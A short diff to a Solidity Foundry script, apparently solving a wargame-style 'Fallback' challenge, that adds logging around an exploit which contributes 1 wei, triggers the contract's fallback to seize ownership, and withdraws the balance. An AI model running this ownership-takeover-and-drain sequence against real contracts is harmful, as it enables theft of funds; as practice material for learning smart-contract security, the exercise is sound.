@@ -13,8 +13,10 @@ contract AttackerFallbackScript is Script {
         fallbck.contribute{value: 1 wei}();
         fallbck.getContribution();
 
+        console.log("Current Owner is : ", fallbck.owner());
         (bool success, ) = address(fallbck).call{value: 1 wei}("");
         require(success, "Transfer failed!");
+        console.log("New Owner is : ", fallbck.owner());
 
         fallbck.owner();
         fallbck.withdraw();
